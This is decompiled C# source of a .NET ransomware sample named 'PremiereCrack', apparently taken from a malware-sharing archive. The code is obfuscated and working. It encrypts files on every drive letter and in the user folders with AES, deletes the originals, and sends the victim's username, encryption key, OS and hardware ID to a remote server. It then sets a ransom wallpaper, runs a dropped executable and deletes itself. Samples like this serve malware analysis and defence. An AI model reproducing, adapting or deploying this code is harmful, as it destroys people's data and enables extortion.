// Decompiled with JetBrains decompiler
// Type: PremiereCrack.Form1
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PremiereCrack
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> T = new List<WeakReference>();
    private IContainer T;
    [AccessedThroughProperty("TextBox1")]
    private TextBox T;
    [AccessedThroughProperty("TextBox2")]
    private TextBox E;
    private object T;
    private byte[] T;
    private byte[] E;
    private byte[] H;
    private byte[] U;
    private byte[] R;
    public string TargetKey;
    public int count;
    public string Extentsion;
    private string T;
    private Random T;
    private const int T = 20;
    private const int E = 1;
    private const int H = 2;
    public FileStream fsInput;
    public FileStream fsOutput;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.H);
      Form1.H((object) this);
      this.T = (object) A.A.T(937);
      this.T = Convert.FromBase64String(A.A.T(960));
      this.E = Convert.FromBase64String(A.A.T(985));
      this.H = Convert.FromBase64String(A.A.T(1179));
      this.U = Convert.FromBase64String(A.A.T(1212));
      this.R = Convert.FromBase64String(A.A.T(1285));
      this.Extentsion = GE.T(A.A.T(1358), this.GenerateHWID());
      this.T = A.A.T(1361);
      this.T = new Random();
      this.H();
    }

    [DebuggerNonUserCode]
    private static void H(object T)
    {
      List<WeakReference> t = Form1.T;
      bool lockTaken = G.T(188) != 0;
      try
      {
        Monitor.Enter((object) t, ref lockTaken);
        if (Form1.T.Count == Form1.T.Capacity)
        {
label_2:
          switch (6)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.H);
              }
              int index1 = G.T(192);
              int num1 = G.T(196);
              int num2 = checked (Form1.T.Count - G.T(200));
              int index2 = num1;
              while (index2 <= num2)
              {
                if (Form1.T[index2].IsAlive)
                {
label_7:
                  switch (5)
                  {
                    case 0:
                      goto label_7;
                    default:
                      if ((index2 == index1 ? 1 : 0) == G.T(204))
                      {
label_9:
                        switch (4)
                        {
                          case 0:
                            goto label_9;
                          default:
                            Form1.T[index1] = Form1.T[index2];
                            break;
                        }
                      }
                      checked { index1 += G.T(208); }
                      break;
                  }
                }
                checked { index2 += G.T(212); }
              }
label_14:
              switch (7)
              {
                case 0:
                  goto label_14;
                default:
                  Form1.T.RemoveRange(index1, checked (Form1.T.Count - index1));
                  Form1.T.Capacity = Form1.T.Count;
                  break;
              }
              break;
          }
        }
        Form1.T.Add(new WeakReference(RuntimeHelpers.GetObjectValue(T)));
      }
      finally
      {
        if (lockTaken)
        {
label_18:
          switch (1)
          {
            case 0:
              goto label_18;
            default:
              Monitor.Exit((object) t);
              break;
          }
        }
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        int num;
        if (disposing)
        {
label_2:
          switch (4)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Dispose);
              }
              if (this.T == null)
              {
label_6:
                switch (2)
                {
                  case 0:
                    goto label_6;
                }
              }
              else
              {
                num = G.T(220);
                goto label_9;
              }
              break;
          }
        }
        num = G.T(216);
label_9:
        if (num == 0)
          return;
label_10:
        switch (4)
        {
          case 0:
            goto label_10;
          default:
            this.T.Dispose();
            break;
        }
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void H()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(System.Type.GetTypeFromHandle(OE.T()));
      this.T = new TextBox();
      this.E = new TextBox();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.T, A.A.T(182));
      this.T.Name = A.A.T(182);
      componentResourceManager.ApplyResources((object) this.E, A.A.T(199));
      this.E.Name = A.A.T(199);
      componentResourceManager.ApplyResources((object) this, A.A.T(216));
      this.AutoScaleMode = (AutoScaleMode) G.T(224);
      this.ControlBox = G.T(228) != 0;
      this.Controls.Add((Control) this.E);
      this.Controls.Add((Control) this.T);
      this.FormBorderStyle = (FormBorderStyle) G.T(232);
      this.MaximizeBox = G.T(236) != 0;
      this.MinimizeBox = G.T(240) != 0;
      this.Name = A.A.T(227);
      this.Opacity = G.T(244);
      this.ShowIcon = G.T(252) != 0;
      this.ShowInTaskbar = G.T(256) != 0;
      this.WindowState = (FormWindowState) G.T(260);
      this.ResumeLayout(G.T(264) != 0);
      this.PerformLayout();
    }

    internal virtual TextBox T
    {
      [DebuggerNonUserCode] get => this.T;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.T = value;
    }

    internal virtual TextBox E
    {
      [DebuggerNonUserCode] get => this.E;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.E = value;
    }

    private void H(string T)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(T);
      try
      {
        FileInfo[] files = directoryInfo.GetFiles(A.A.T(238));
        int num1 = G.T(268);
        int num2 = checked ((int) YE.T(files) - G.T(272));
        int index1 = num1;
        while (index1 <= num2)
        {
          FileInfo fileInfo = files[index1];
          if (fileInfo.FullName.EndsWith(this.Extentsion) | fileInfo.FullName.EndsWith(A.A.T(245)) | Operators.CompareString(fileInfo.FullName, Assembly.GetEntryAssembly().Location, G.T(276) != 0) == G.T(280) | fileInfo.FullName.EndsWith(A.A.T(254)))
          {
label_3:
            switch (5)
            {
              case 0:
                goto label_3;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.H);
                  break;
                }
                break;
            }
          }
          else
          {
            byte[] key = this.CreateKey(this.TargetKey);
            byte[] U = this.H(this.TargetKey);
            this.H(fileInfo.FullName, GE.T(fileInfo.FullName, this.Extentsion), key, U, (Form1.X) G.T(284));
            if (System.IO.File.Exists(fileInfo.FullName))
            {
label_8:
              switch (5)
              {
                case 0:
                  goto label_8;
                default:
                  System.IO.File.Delete(fileInfo.FullName);
                  break;
              }
            }
            checked { this.count += G.T(288); }
          }
          checked { index1 += G.T(292); }
        }
label_13:
        switch (2)
        {
          case 0:
            goto label_13;
          default:
            DirectoryInfo[] directories = directoryInfo.GetDirectories();
            int num3 = G.T(296);
            int num4 = checked ((int) CE.T(directories) - G.T(300));
            int index2 = num3;
            while (index2 <= num4)
            {
              this.H(directories[index2].FullName);
              checked { index2 += G.T(304); }
            }
label_17:
            switch (3)
            {
              case 0:
                goto label_17;
              default:
                return;
            }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void H(object T, EventArgs E)
    {
      this.Hide();
      this.ShowInTaskbar = G.T(308) != 0;
      this.FormBorderStyle = (FormBorderStyle) G.T(312);
      string T1 = "";
      int num = G.T(316);
      do
      {
        if (num == G.T(320) | num == G.T(324) | num == G.T(328) | num == G.T(332) | num == G.T(336) | num == G.T(340))
        {
label_2:
          switch (5)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.H);
              }
              T1 = GE.T(T1, A.A.T(277));
              break;
          }
        }
        else
        {
          int index = this.T.Next(G.T(344), G.T(348));
          T1 = GE.T(T1, Conversions.ToString(this.T[index]));
        }
        checked { num += G.T(352); }
      }
      while (num <= G.T(356));
label_8:
      switch (7)
      {
        case 0:
          goto label_8;
        default:
          this.TargetKey = T1;
          string t = KE.T;
          this.A_Drive();
          this.B_Drive();
          this.D_Drive();
          this.E_Drive();
          this.F_Drive();
          this.G_Drive();
          this.H_Drive();
          this.I_Drive();
          this.J_Drive();
          this.K_Drive();
          this.L_Drive();
          this.M_Drive();
          this.N_Drive();
          this.O_Drive();
          this.P_Drive();
          this.Q_Drive();
          this.R_Drive();
          this.S_Drive();
          this.T_Drive();
          this.U_Drive();
          this.V_Drive();
          this.W_Drive();
          this.X_Drive();
          this.Y_Drive();
          this.Z_Drive();
          this.Programms();
          this.ProgrammsX86();
          this.ProgrammFiles();
          this.Documents();
          this.Pictures();
          this.Videos();
          this.OneDrive();
          this.Music();
          this.Downloads();
          this.Desktop();
          this.Delay(G.T(360));
          string[] T2 = Q.T(G.T(368));
          T2[G.T(372)] = Encoding.ASCII.GetString(this.E);
          T2[G.T(376)] = Environment.UserName;
          T2[G.T(380)] = A.A.T(284);
          T2[G.T(384)] = this.TargetKey;
          T2[G.T(388)] = A.A.T(284);
          T2[G.T(392)] = I.T.Info.OSFullName;
          T2[G.T(396)] = A.A.T(284);
          T2[G.T(400)] = this.GenerateHWID();
          T2[G.T(404)] = A.A.T(284);
          T2[G.T(408)] = this.count.ToString();
          Form1.POST(LE.T(T2));
          this.setInst();
          break;
      }
    }

    public void setInst()
    {
      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
      Graphics graphics1 = Graphics.FromImage((Image) bitmap);
      try
      {
        graphics1.Clear(System.Drawing.Color.Red);
        graphics1.InterpolationMode = (InterpolationMode) G.T(412);
        graphics1.SmoothingMode = (SmoothingMode) G.T(416);
        graphics1.TextRenderingHint = (TextRenderingHint) G.T(420);
        Font font1 = new Font(A.A.T(287), G.T(424));
        try
        {
          Random random = new Random();
          int num1 = G.T(428);
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          int num2 = checked (bounds.Height - G.T(432));
          int y1 = num1;
          while (y1 <= num2)
          {
            int num3 = G.T(436);
            int num4 = checked (Screen.PrimaryScreen.Bounds.Width - G.T(440));
            int x = num3;
            while (x <= num4)
            {
              int num5 = random.Next(G.T(444), G.T(448));
              if (num5 == G.T(452))
              {
label_5:
                switch (2)
                {
                  case 0:
                    goto label_5;
                  default:
                    if (false)
                    {
                      // ISSUE: method reference
                      RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.setInst);
                    }
                    bitmap.SetPixel(x, y1, System.Drawing.Color.DarkGray);
                    break;
                }
              }
              else if (num5 == G.T(456))
              {
label_10:
                switch (3)
                {
                  case 0:
                    goto label_10;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Red);
                    break;
                }
              }
              else if (num5 == G.T(460))
              {
label_13:
                switch (6)
                {
                  case 0:
                    goto label_13;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Yellow);
                    break;
                }
              }
              else if (num5 == G.T(464))
              {
label_16:
                switch (6)
                {
                  case 0:
                    goto label_16;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Blue);
                    break;
                }
              }
              else if (num5 == G.T(468))
              {
label_19:
                switch (5)
                {
                  case 0:
                    goto label_19;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Pink);
                    break;
                }
              }
              else if (num5 == G.T(472))
              {
label_22:
                switch (5)
                {
                  case 0:
                    goto label_22;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Green);
                    break;
                }
              }
              else if (num5 == G.T(476))
              {
label_25:
                switch (4)
                {
                  case 0:
                    goto label_25;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Orange);
                    break;
                }
              }
              else if (num5 == G.T(480))
              {
label_28:
                switch (2)
                {
                  case 0:
                    goto label_28;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.Lime);
                    break;
                }
              }
              else if (num5 == G.T(484))
              {
label_31:
                switch (6)
                {
                  case 0:
                    goto label_31;
                  default:
                    bitmap.SetPixel(x, y1, System.Drawing.Color.LightBlue);
                    break;
                }
              }
              else
                bitmap.SetPixel(x, y1, System.Drawing.Color.DimGray);
              checked { x += G.T(488); }
            }
label_36:
            switch (1)
            {
              case 0:
                goto label_36;
              default:
                checked { y1 += G.T(492); }
                continue;
            }
          }
label_39:
          switch (4)
          {
            case 0:
              goto label_39;
            default:
              SolidBrush solidBrush1 = new SolidBrush(System.Drawing.Color.Red);
              try
              {
                Graphics graphics2 = graphics1;
                string text = this.E.Text;
                Font font2 = font1;
                SolidBrush solidBrush2 = solidBrush1;
                bounds = Screen.PrimaryScreen.Bounds;
                double x = (double) bounds.Width / G.T(496) - G.T(504);
                double y2 = (double) G.T(512);
                graphics2.DrawString(text, font2, (Brush) solidBrush2, (float) x, (float) y2);
                break;
              }
              finally
              {
                if ((solidBrush1 == JE.T ? 1 : 0) == G.T(516))
                {
label_43:
                  switch (7)
                  {
                    case 0:
                      goto label_43;
                    default:
                      solidBrush1.Dispose();
                      break;
                  }
                }
              }
          }
        }
        finally
        {
          if ((font1 == QE.T ? 1 : 0) == G.T(520))
          {
label_47:
            switch (6)
            {
              case 0:
                goto label_47;
              default:
                font1.Dispose();
                break;
            }
          }
        }
      }
      finally
      {
        if ((graphics1 == VE.T ? 1 : 0) == G.T(524))
        {
label_51:
          switch (3)
          {
            case 0:
              goto label_51;
            default:
              graphics1.Dispose();
              break;
          }
        }
      }
      bitmap.Save(FE.T(I.T.FileSystem.SpecialDirectories.Desktop, A.A.T(304), Encoding.ASCII.GetString(this.H), Encoding.ASCII.GetString(this.R)), ImageFormat.Png);
      int T = G.T(528);
      int E = G.T(532);
      string str = FE.T(I.T.FileSystem.SpecialDirectories.Desktop, A.A.T(304), Encoding.ASCII.GetString(this.H), Encoding.ASCII.GetString(this.R));
      ref string local = ref str;
      int U = G.T(536);
      Form1.H(T, E, ref local, U);
      string[] strArray = Q.T(G.T(540));
      strArray[G.T(544)] = this.T.Text;
      string[] contents = strArray;
      if ((System.IO.File.Exists(FE.T(I.T.FileSystem.SpecialDirectories.Desktop, A.A.T(304), Encoding.ASCII.GetString(this.H), Encoding.ASCII.GetString(this.U))) ? 1 : 0) == G.T(548))
      {
label_55:
        switch (3)
        {
          case 0:
            goto label_55;
          default:
            System.IO.File.WriteAllLines(FE.T(I.T.FileSystem.SpecialDirectories.Desktop, A.A.T(304), Encoding.ASCII.GetString(this.H), Encoding.ASCII.GetString(this.U)), contents);
            StreamWriter streamWriter = new StreamWriter(FE.T(I.T.FileSystem.SpecialDirectories.Desktop, A.A.T(304), Encoding.ASCII.GetString(this.H), A.A.T(307)));
            streamWriter.Write(GE.T(A.A.T(332), this.GenerateHWID()));
            streamWriter.Close();
            break;
        }
      }
      if (System.IO.File.Exists(GE.T(I.T.FileSystem.SpecialDirectories.Temp, A.A.T(355))))
      {
label_58:
        switch (5)
        {
          case 0:
            goto label_58;
          default:
            System.IO.File.Delete(GE.T(I.T.FileSystem.SpecialDirectories.Temp, A.A.T(355)));
            break;
        }
      }
      System.IO.File.WriteAllBytes(GE.T(I.T.FileSystem.SpecialDirectories.Temp, A.A.T(355)), S.UI);
      Process.Start(GE.T(I.T.FileSystem.SpecialDirectories.Temp, A.A.T(355)));
      this.TargetKey = KE.T;
      Process.Start(new ProcessStartInfo(A.A.T(372))
      {
        Arguments = AE.T(A.A.T(387), Application.ExecutablePath, A.A.T(466)),
        CreateNoWindow = G.T(552) != 0,
        ErrorDialog = G.T(556) != 0,
        WindowStyle = (ProcessWindowStyle) G.T(560)
      });
      Application.ExitThread();
    }

    [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int H(int T, int E, [MarshalAs(UnmanagedType.VBByRefStr)] ref string H, int U);

    public void Delay(double dblSecs)
    {
      DateAndTime.Now.AddSeconds(G.T(564));
      DateTime t2 = DateAndTime.Now.AddSeconds(G.T(572)).AddSeconds(dblSecs);
      while ((DateTime.Compare(DateAndTime.Now, t2) > G.T(580) ? 1 : 0) == G.T(584))
        Application.DoEvents();
label_3:
      switch (3)
      {
        case 0:
          goto label_3;
        default:
          if (true)
            break;
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Delay);
          break;
      }
    }

    public string GenerateHWID()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(A.A.T(469));
      string s = Conversions.ToString(Operators.ConcatenateObject((object) Environment.MachineName, registryKey.GetValue(A.A.T(562))));
      registryKey.Close();
      byte[] hash = new SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(s));
      string T1 = "";
      byte[] T2 = hash;
      int index = G.T(588);
      while (index < checked ((int) BE.T(T2)))
      {
        byte num = T2[index];
        T1 = GE.T(T1, num.ToString(A.A.T(601)));
        checked { index += G.T(592); }
      }
label_3:
      switch (6)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.GenerateHWID);
          }
          return T1.ToUpper();
      }
    }

    public static string POST(string URL)
    {
      string str = new WebClient()
      {
        Headers = {
          {
            A.A.T(606),
            URL
          }
        }
      }.DownloadString(URL);
      HttpWebRequest httpWebRequest = PE.T((object) WebRequest.Create(URL));
      httpWebRequest.Method = A.A.T(621);
      httpWebRequest.ContentType = A.A.T(630);
      string s = str;
      byte[] bytes = Encoding.UTF8.GetBytes(s);
      httpWebRequest.ContentLength = (long) checked ((int) BE.T(bytes));
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, G.T(596), checked ((int) BE.T(bytes)));
      requestStream.Close();
      HttpWebResponse httpWebResponse = ME.T((object) httpWebRequest.GetResponse());
      Stream responseStream = httpWebResponse.GetResponseStream();
      StreamReader streamReader = new StreamReader(responseStream);
      streamReader.ReadToEnd();
      streamReader.Close();
      responseStream.Close();
      httpWebResponse.Close();
      return s;
    }

    public void Desktop()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(600)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(604)));
    }

    public void Music()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(608)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(612)));
    }

    public void Documents()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(616)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(620)));
    }

    public void Videos()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(624)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(628)));
    }

    public void Programms()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(632)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(636)));
    }

    public void ProgrammsX86()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(640)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(644)));
    }

    public void Contacts() => this.H(AE.T(Encoding.ASCII.GetString(this.T), Environment.UserName, A.A.T(697)));

    public void Downloads() => this.H(AE.T(Encoding.ASCII.GetString(this.T), Environment.UserName, A.A.T(718)));

    public void UserDirs() => this.H(GE.T(Encoding.ASCII.GetString(this.T), Environment.UserName));

    public void OneDrive() => this.H(AE.T(Encoding.ASCII.GetString(this.T), Environment.UserName, A.A.T(741)));

    public void ProgrammFiles()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(648)));
      this.H(Conversions.ToString(G.T(652)));
    }

    public void Windows() => this.H(Conversions.ToString(G.T(656)));

    public void Pictures()
    {
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(660)));
      this.H(Environment.GetFolderPath((Environment.SpecialFolder) G.T(664)));
    }

    public void A_Drive() => this.H(A.A.T(762));

    public void B_Drive() => this.H(A.A.T(769));

    public void D_Drive() => this.H(A.A.T(776));

    public void E_Drive() => this.H(A.A.T(783));

    public void F_Drive() => this.H(A.A.T(790));

    public void G_Drive() => this.H(A.A.T(797));

    public void H_Drive() => this.H(A.A.T(804));

    public void I_Drive() => this.H(A.A.T(811));

    public void J_Drive() => this.H(A.A.T(818));

    public void K_Drive() => this.H(A.A.T(825));

    public void L_Drive() => this.H(A.A.T(832));

    public void M_Drive() => this.H(A.A.T(839));

    public void N_Drive() => this.H(A.A.T(846));

    public void O_Drive() => this.H(A.A.T(853));

    public void P_Drive() => this.H(A.A.T(860));

    public void Q_Drive() => this.H(A.A.T(867));

    public void R_Drive() => this.H(A.A.T(874));

    public void S_Drive() => this.H(A.A.T(881));

    public void T_Drive() => this.H(A.A.T(888));

    public void U_Drive() => this.H(A.A.T(895));

    public void V_Drive() => this.H(A.A.T(902));

    public void W_Drive() => this.H(A.A.T(909));

    public void X_Drive() => this.H(A.A.T(916));

    public void Y_Drive() => this.H(A.A.T(923));

    public void Z_Drive() => this.H(A.A.T(930));

    public byte[] CreateKey(string strPassword)
    {
      char[] charArray = strPassword.ToCharArray();
      byte[] buffer = WE.T(checked (charArray.GetUpperBound(G.T(668)) + G.T(672)));
      int num = G.T(676);
      int upperBound = charArray.GetUpperBound(G.T(680));
      int index1 = num;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Strings.Asc(charArray[index1]));
        checked { index1 += G.T(684); }
      }
label_3:
      switch (1)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.CreateKey);
          }
          byte[] hash = new SHA512Managed().ComputeHash(buffer);
          byte[] key = WE.T(G.T(688));
          int index2 = G.T(692);
          do
          {
            key[index2] = hash[index2];
            checked { index2 += G.T(696); }
          }
          while (index2 <= G.T(700));
label_8:
          switch (7)
          {
            case 0:
              goto label_8;
            default:
              return key;
          }
      }
    }

    private byte[] H(string T)
    {
      char[] charArray = T.ToCharArray();
      byte[] buffer = WE.T(checked (charArray.GetUpperBound(G.T(704)) + G.T(708)));
      int num = G.T(712);
      int upperBound = charArray.GetUpperBound(G.T(716));
      int index1 = num;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Strings.Asc(charArray[index1]));
        checked { index1 += G.T(720); }
      }
label_3:
      switch (7)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.H);
          }
          byte[] hash = new SHA512Managed().ComputeHash(buffer);
          byte[] numArray = WE.T(G.T(724));
          int index2 = G.T(728);
          do
          {
            numArray[checked (index2 - G.T(732))] = hash[index2];
            checked { index2 += G.T(736); }
          }
          while (index2 <= G.T(740));
label_8:
          switch (4)
          {
            case 0:
              goto label_8;
            default:
              return numArray;
          }
      }
    }

    private void H(string T, string E, byte[] H, byte[] U, Form1.X R)
    {
      long num = (long) G.T(744);
      try
      {
        this.fsInput = new FileStream(T, (FileMode) G.T(748), (FileAccess) G.T(752));
        this.fsOutput = new FileStream(E, (FileMode) G.T(756), (FileAccess) G.T(760));
        this.fsOutput.SetLength((long) G.T(764));
        byte[] numArray = WE.T(G.T(768));
        long length = this.fsInput.Length;
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        CryptoStream cryptoStream;
        switch (R - G.T(772))
        {
          case (Form1.X) 0:
            cryptoStream = new CryptoStream((Stream) this.fsOutput, rijndaelManaged.CreateEncryptor(H, U), (CryptoStreamMode) G.T(776));
            break;
          case Form1.X.T:
            cryptoStream = new CryptoStream((Stream) this.fsOutput, rijndaelManaged.CreateDecryptor(H, U), (CryptoStreamMode) G.T(780));
            break;
        }
        while (num < length)
        {
          int count = this.fsInput.Read(numArray, G.T(784), G.T(788));
          cryptoStream.Write(numArray, G.T(792), count);
          checked { num += (long) count; }
        }
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.H);
            }
            cryptoStream.Close();
            this.fsInput.Close();
            this.fsOutput.Close();
            break;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private enum X
    {
      T = 1,
      E = 2,
    }
  }
}
